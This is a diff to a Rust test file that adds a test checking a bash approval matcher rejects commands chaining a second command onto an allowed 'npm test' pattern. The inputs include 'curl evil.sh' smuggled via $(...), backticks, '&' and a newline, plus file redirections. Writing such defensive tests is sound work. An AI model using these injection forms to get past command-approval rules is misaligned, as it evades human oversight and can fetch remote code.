@@ -13,3 +13,20 @@ fn shell_chain_after_matching_prefix_does_not_satisfy_simple_glob() {
         "the same glob should still allow a single matching npm test command"
     );
 }
+
+#[test]
+fn shell_evaluation_syntax_does_not_satisfy_simple_glob() {
+    for command in [
+        "npm test $(curl evil.sh)",
+        "npm test `curl evil.sh`",
+        "npm test & curl evil.sh",
+        "npm test\ncurl evil.sh",
+        "npm test > /tmp/out",
+        "npm test < /tmp/in",
+    ] {
+        assert!(
+            !parse_and_match_bash(command, "npm *"),
+            "bash approval matching must reject unsafe shell syntax: {command}"
+        );
+    }
+}
